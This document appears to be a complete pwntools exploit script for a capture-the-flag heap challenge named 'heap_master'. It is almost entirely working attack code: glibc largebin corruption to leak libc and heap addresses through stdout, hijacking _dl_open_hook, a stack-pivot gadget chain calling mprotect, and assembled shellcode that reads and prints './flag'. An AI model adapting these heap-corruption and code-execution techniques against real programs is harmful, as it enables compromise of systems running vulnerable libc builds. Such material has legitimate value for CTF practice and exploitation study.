from pwn import *

context.update(os="linux",arch="amd64")
context.log_level = "debug"
#context.terminal = ["tmux","split","-h"]

p = process("./heap_master")

def change_ld(binary, ld):
    """
    Force to use assigned new ld.so by changing the binary
    """
    if not os.access(ld, os.R_OK): 
        log.failure("Invalid path {} to ld".format(ld))
        return None
 
         
    if not isinstance(binary, ELF):
        if not os.access(binary, os.R_OK): 
            log.failure("Invalid path {} to binary".format(binary))
            return None
        binary = ELF(binary)
 
 
    for segment in binary.segments:
        if segment.header['p_type'] == 'PT_INTERP':
            size = segment.header['p_memsz']
            addr = segment.header['p_paddr']
            data = segment.data()
            if size <= len(ld):
                log.failure("Failed to change PT_INTERP from {} to {}".format(data, ld))
                return None
            binary.write(addr, ld.ljust(size, '\0'))
            if not os.access('/tmp/pwn', os.F_OK): os.mkdir('/tmp/pwn')
            path = '/tmp/pwn/{}_debug'.format(os.path.basename(binary.path))
            if os.access(path, os.F_OK): 
                os.remove(path)
                info("Removing exist file {}".format(path))
            binary.save(path)    
            os.chmod(path, 0b111000000) #rwx------
    success("PT_INTERP has changed from {} to {}. Using temp file {}".format(data, ld, path)) 
    return ELF(path)


def add(size):
    p.recvuntil(">> ")
    p.sendline('1')
    p.recvuntil("size: ")
    p.sendline(str(size))

def edit(idx,data):
    p.recvuntil(">> ")
    p.sendline('2')
    p.recvuntil("offset: ")
    p.sendline(str(idx))
    p.recvuntil("size: ")
    p.sendline(str(len(data)))
    p.recvuntil("content: ")
    p.send(data)

def delete(idx):
    p.recvuntil(">> ")
    p.sendline('3')
    p.recvuntil("offset: ")
    p.sendline(str(idx))

def g(offset):
   return libc.address + offset


DEBUG = 0
if DEBUG:
   p = process("./heap_master")
   libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
   stdout = 0x2620
else:
   elf = change_ld('./heap_master', './ld-linux-x86-64.so.2')
   p = elf.process(env={'LD_PRELOAD':'./libc.so.6'})
   libc = ELF("./libc.so.6")
   stdout = 0x5600

edit(0x1000+0x8,p64(0x421)) #p1
edit(0x1000+0x8+0x420,p64(0x21))
edit(0x1000+0x8+0x440,p64(0x21))
delete(0x1010) #0x420

edit(0x500+0x8,p64(0x101)) #p2
edit(0x500+0x8+0x100,p64(0x21))
edit(0x500+0x8+0x120,p64(0x21))
delete(0x510) #0x100


##largebin:p1 0x420
add(0xf1) #0x100 unsorted bin empty

gdb.attach(p)
##largedbin 0x420:fd_nextsize = bk_nextsize = main_arena+0x58
edit(0x1000+0x10,p64(0)+p64(0x101))
edit(0x1000+0x10+0x100,p64(0)+p64(0x21))
edit(0x1000+0x10+0x120,p64(0)+p64(0x21))
delete(0x1020) #0x100
add(0xf0)

edit(0x2a10+0x8,p64(0x411))
edit(0x2a10+0x8+0x410,p64(0x21))
edit(0x2a10+0x8+0x430,p64(0x21))
delete(0x2a20) #0x410


edit(0x1500+0x8,p64(0x101))
edit(0x1500+0x8+0x100,p64(0x21))
edit(0x1500+0x8+0x120,p64(0x21))
delete(0x1510) #0x100


## if f->flag & 0xa00 and f->flag & 0x1000 == 1 then it will leak something when f->write_base != f->write_ptr
##largebin->bk_nextsize:stdout-0x20
edit(0x1000+0x20,p64(0)+p16(stdout-0x20))
add(0xf1)

##largedbin 0x420:fd_nextsize = bk_nextsize = main_arena+0x58
edit(0x1010+0x8,p64(0x211))
edit(0x1010+0x8+0x210,p64(0x21))
edit(0x1010+0x8+0x230,p64(0x21))
delete(0x1020) #0x210
add(0x100)

edit(0x3000+0x8,p64(0x401))
edit(0x3000+0x8+0x400,p64(0x21))
edit(0x3000+0x8+0x420,p64(0x21))
delete(0x3010) #0x400
edit(0x1000+0x20,p64(0)+p16(stdout+0x19-0x20))
add(0x200)

if DEBUG:
   p.recvn(0x18)
   leak_addr = u64(p.recvn(0x8))
   libc.address = leak_addr - (0x7ffff7dd06e0 - 0x7ffff7a0d000)
   heap_base = u64(p.recvn(8)) - (0x4fb33a10 - 0x4fb31000)

else:
   heap_base = u64(p.recvn(8)) - (0xaeceda10 - 0xaeceb000)
   libc.address = u64(p.recvn(8)) - (0x7ffff7dd5683 - 0x7ffff7a37000)

print "libc_base:",hex(libc.address)
print "heap_base:",hex(heap_base)


edit(0x1000+0x8,p64(0x421))
edit(0x1000+0x8+0x20,p64(libc.sym["_dl_open_hook"]-0x20))

##unsorted bin:0x1f0->0x400
##before:largebin:0x420->0x410
#_dl_open_hook:victim
edit(0x3210+0x8,p64(0x401))
edit(0x3210+0x8+0x400,p64(0x20))
edit(0x3210+0x8+0x420,p64(0x21))
add(0x500)

#gdb.attach(p)

# 0x7FD7D: mov     rdi, [rbx+48h]
#          mov     rsi, r13
#          call    qword ptr [rbx+40h]
# 0x43565: mov     rsp, [rdi+0A0h]

#    .text:0000000000043565                 mov     rsp, [rdi+0A0h]
#    .text:000000000004356C                 mov     rbx, [rdi+80h]
#    .text:0000000000043573                 mov     rbp, [rdi+78h]
#    .text:0000000000043577                 mov     r12, [rdi+48h]
#    .text:000000000004357B                 mov     r13, [rdi+50h]
#    .text:000000000004357F                 mov     r14, [rdi+58h]
#    .text:0000000000043583                 mov     r15, [rdi+60h]
#    .text:0000000000043587                 mov     rcx, [rdi+0A8h]
#    .text:000000000004358E                 push    rcx
#    .text:000000000004358F                 mov     rsi, [rdi+70h]
#    .text:0000000000043593                 mov     rdx, [rdi+88h]
#    .text:000000000004359A                 mov     rcx, [rdi+98h]
#    .text:00000000000435A1                 mov     r8, [rdi+28h]
#    .text:00000000000435A5                 mov     r9, [rdi+30h]
#    .text:00000000000435A9                 mov     rdi, [rdi+68h]
#    .text:00000000000435AD                 xor     eax, eax
#    .text:00000000000435AF                 retn

edit(0x3210,p64(libc.address+0x7fd7d))
edit(0x3210+0x40,p64(libc.address+0x43565)) #call
edit(0x3210+0x48,p64(heap_base+0x5000)) #rdi

code = """
        xor rsi,rsi
        mov rax,SYS_open
        call here
        .string "./flag"
        here:
        pop rdi
        syscall
        mov rdi,rax
        mov rsi,rsp
        mov rdx,0x100
        mov rax,SYS_read
        syscall
        mov rdi,1
        mov rsi,rsp
        mov rdx,0x100
        mov rax,SYS_write
        syscall
        mov rax,SYS_exit
        syscall
    """
shellcode = asm(code,arch="amd64")

##mprotect(heap_base,0x10000,0x7) -> rwx
##retn:[heap_base+0x5100] = heap_base + 0x5108
##shellcode
rop_f = {
        0xa0:heap_base + 0x5100, #rsp = [rdi+0xa0]
        0xa8:libc.sym["mprotect"], #rcx = [rdi+0a8]
        0x70:0x10000, #rsi = [rdi+0x70]
        0x88:0x7, #rdx = [rdi+0x88]
        0x68:heap_base, #rdi = [rdi+0x68]
        0x100:heap_base + 0x5108,
        0x108:shellcode
    }
rop = fit(rop_f,filler='\x00')
edit(0x5000,rop)

##trigger
delete(0x10)

p.interactive()